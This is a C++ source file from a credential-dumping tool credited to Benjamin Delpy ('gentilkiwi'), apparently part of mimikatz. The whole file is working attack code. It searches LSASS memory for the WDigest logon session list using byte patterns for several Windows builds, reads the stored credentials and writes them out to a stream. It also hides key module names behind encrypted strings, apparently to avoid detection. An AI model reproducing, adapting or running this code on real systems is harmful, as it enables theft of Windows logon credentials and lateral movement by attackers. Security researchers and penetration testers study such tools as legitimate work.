/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence    : http://creativecommons.org/licenses/by-nc-sa/3.0/
	This file  : http://creativecommons.org/licenses/by/3.0/
*/
#include <Windows.h>
#include <Psapi.h>

#include "..\lpmemory.h"
#include "..\..\inc\dbg.h"
#include "..\..\inc\mem.h"	
#include "..\..\inc\CryptoStrings.h"

#include "wdigest.h"

WDIGEST_MODULE_CONTEXT wdigContext;

VOID wdig_InitGlobals()
{
	wdigContext = { 0 };
}

bool searchWDigestEntryList(LP_MODULE_CONTEXT *pContext)
{
	LPWSTR wszWdigest;
	LPSTR szSpInstanceInit;

#ifdef _M_X64
	BYTE PTRN_WNO8_InsertInLogSess[]= {0x4c, 0x89, 0x1b, 0x48, 0x89, 0x43, 0x08, 0x49, 0x89, 0x5b, 0x08, 0x48, 0x8d};
	BYTE PTRN_W8CP_InsertInLogSess[]= {0x4c, 0x89, 0x1b, 0x48, 0x89, 0x4b, 0x08, 0x49, 0x8b, 0x43, 0x08, 0x4c, 0x39};
	BYTE PTRN_W8RP_InsertInLogSess[]= {0x4c, 0x89, 0x1b, 0x48, 0x89, 0x43, 0x08, 0x49, 0x39, 0x43, 0x08, 0x0f, 0x85};
#elif defined _M_IX86
	BYTE PTRN_WNO8_InsertInLogSess[]= {0x8b, 0x45, 0x08, 0x89, 0x08, 0xc7, 0x40, 0x04};
	BYTE PTRN_W8CP_InsertInLogSess[]= {0x89, 0x0e, 0x89, 0x56, 0x04, 0x8b, 0x41, 0x04};
	BYTE PTRN_W8RP_InsertInLogSess[]= {0x89, 0x06, 0x89, 0x4e, 0x04, 0x39, 0x48, 0x04};
#endif
	LONG OFFS_WALL_InsertInLogSess	= -4;

	if (pContext->pModWDIGEST && !wdigContext.l_LogSessList)
	{
		PBYTE *pointeur = NULL; PBYTE pattern = NULL; ULONG taille = 0; LONG offset = 0;

		pointeur = reinterpret_cast<PBYTE *>(&wdigContext.l_LogSessList);
		offset	= OFFS_WALL_InsertInLogSess;
		if (pContext->GLOB_Version.dwBuildNumber < 8000)
		{
			pattern	= PTRN_WNO8_InsertInLogSess;
			taille	= sizeof(PTRN_WNO8_InsertInLogSess);
		}
		else if (pContext->GLOB_Version.dwBuildNumber < 8400)
		{
			pattern	= PTRN_W8CP_InsertInLogSess;
			taille	= sizeof(PTRN_W8CP_InsertInLogSess);
		}
		else
		{
			pattern	= PTRN_W8RP_InsertInLogSess;
			taille	= sizeof(PTRN_W8RP_InsertInLogSess);
		}

		wszWdigest = CRSTRW("wdigest", "\x00\xa0\xdb\x0e\x07\xa0\xcc\x02\x19\xbf\x3e\xf5\xe4\xdc\x1c");
		szSpInstanceInit = CRSTRA("SpInstanceInit", "\x00\x20\x70\x0d\x0e\x20\x43\x15\x39\x36\x83\xf1\xf1\xd6\xb3\xc0\xf9\xf6\xd9\xb1\x39\xe9\xa3");

		if (HMODULE monModule = LoadLibrary(wszWdigest))
		{
			MODULEINFO mesInfos;
			if(GetModuleInformation(GetCurrentProcess(), monModule, &mesInfos, sizeof(MODULEINFO)))
			{
				lp_genericPatternSearch(pointeur, wszWdigest, pattern, taille, offset, szSpInstanceInit, false);
				*pointeur += pContext->pModWDIGEST->modBaseAddr - reinterpret_cast<PBYTE>(mesInfos.lpBaseOfDll);
			}
			FreeLibrary(monModule);
		}

		my_free(szSpInstanceInit);
		my_free(wszWdigest);

#ifdef _M_X64
		wdigContext.offsetWDigestPrimary = ((pContext->GLOB_Version.dwMajorVersion < 6) ? ((pContext->GLOB_Version.dwMinorVersion < 2) ? 36 : 48) : 48);
#elif defined _M_IX86
		wdigContext.offsetWDigestPrimary = ((pContext->GLOB_Version.dwMajorVersion < 6) ? ((pContext->GLOB_Version.dwMinorVersion < 2) ? 36 : 28) : 32);
#endif
	}
	return (pContext->pModWDIGEST && wdigContext.l_LogSessList);
}

bool WINAPI getWDigestLogonData(LP_MODULE_CONTEXT *pContext, __in PLUID logId)
{
	if (searchWDigestEntryList(pContext))
	{
		PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCreds = NULL;
		DWORD taille = wdigContext.offsetWDigestPrimary + sizeof(KIWI_GENERIC_PRIMARY_CREDENTIAL);
		BYTE * monBuff = new BYTE[taille];
		if (PLIST_ENTRY pLogSession = lpgetPtrFromLinkedListByLuid(pContext, reinterpret_cast<PLIST_ENTRY>(wdigContext.l_LogSessList), FIELD_OFFSET(KIWI_WDIGEST_LIST_ENTRY, LocallyUniqueIdentifier), logId))
			if (lp_readMemory(pLogSession, monBuff, taille, pContext->hLSASS))
				mesCreds = reinterpret_cast<PKIWI_GENERIC_PRIMARY_CREDENTIAL>(reinterpret_cast<PBYTE>(monBuff)+wdigContext.offsetWDigestPrimary);

		#ifdef _DEBUG
				pContext->wszPackageName = L"wdigest";
		#endif
		lpgenericCredsToStream(pContext, mesCreds, FALSE);
		delete [] monBuff;
	} //else { DbgPrint("ERR: wdigest module init failed"); }

	return true;
}
